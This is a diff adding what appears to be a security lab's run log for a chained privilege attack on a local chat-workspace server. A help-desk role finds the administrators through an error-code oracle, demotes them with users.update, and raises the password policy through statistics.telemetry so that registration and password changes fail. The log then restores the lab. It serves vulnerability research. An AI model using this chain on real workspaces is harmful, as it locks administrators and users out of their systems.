@@ -1,0 +1,24 @@
+========================================================================
+CHAIN-004: a delegated help-desk role removes every administrator, then breaks what only they could fix
+target : http://127.0.0.1:39649
+author : Blue Spider
+========================================================================
+[INFO] chaining VULN-020 (the role oracle) -> VULN-069 (users.update strips admin) -> VULN-057 (statistics.telemetry writes a policy nobody is left to undo)
+[SETUP] safety net: spare_08a9b1e2 is a spare administrator, kept alive so the lab can be restored; it is deleted at the end
+[SETUP] attacker desk_08a9b1e2 holds moderator, which the administrator just granted assign-roles, edit-other-user-info, view-full-other-user-info (previously {"assign-roles": ["admin"], "edit-other-user-info": ["admin"], "view-full-other-user-info": ["admin"]}); assign-admin-role stays with ['admin']
+[STEP] 1/3 VULN-020: sweep the workspace's accounts through roles.addUserToRole and read each answer from the error code
+[PROOF]     the oracle answered for 21 accounts and named the administrators ['admin', 'spare_08a9b1e2']; the administrator's own view of the admin role is ['admin', 'spare_08a9b1e2'] (identical=True)
+[STEP] 2/3 VULN-069: users.update with a roles array that omits admin, for every administrator found (the spare is left alive on purpose)
+[INFO]     the promotion side is guarded, so this is one-way: users.update adding admin -> HTTP 400 {"success":false,"error":"Assigning admin is not allowed [error-action-not-allowed]","errorType":"error-action
+[PROOF]     demoted [('admin', 200)]: the workspace's own admin account now holds ['user']
+[PROOF]     with its own, still-valid session the demoted administrator reads a protected setting -> HTTP 403 and writes one -> HTTP 403: it is an ordinary user now
+[PROOF]     administrators remaining in the workspace: ['spare_08a9b1e2'] (only the spare this run created; the same call removes it, which would leave none)
+[STEP] 3/3 VULN-057: raise Accounts_Password_Policy_MinLength by 400 through statistics.telemetry, as the same help-desk account
+[PROOF]     400 increments (last HTTP 200): Accounts_Password_Policy_MinLength went from 14 to 414; a new user's registration with a strong password -> HTTP 400 The password provided does not meet the server's password po, and a password change -> HTTP 400 The password provided does not meet the server's password po
+[PROOF]     the workspace's own administrator trying to put Accounts_Password_Policy_MinLength back -> HTTP 403 {"success":false,"error":"User does not have the permissions required for this action","er; the setting is still 414
+[INFO] cleanup: the spare administrator restores the policy and the administrator role, then everything this run created is deleted
+[INFO]     admin roles restored to ['admin']; its own session reads a protected setting again -> HTTP 200
+[INFO]     delegated permissions put back: {"assign-roles": ["admin"], "edit-other-user-info": ["admin"], "view-full-other-user-info": ["admin"]}
+[INFO]     accounts and role removed; workspace administrators: ['admin']
+[OK] CHAIN-004 CONFIRMED
+==> CHAIN-004 CONFIRMED 2026-11-24 - a help-desk role with no admin rights named the administrators through the roles oracle, demoted the workspace's own administrator account with users.update, raised the password policy through statistics.telemetry so that registration and password changes fail for everyone, and the demoted administrator was then refused when it tried to put the setting back
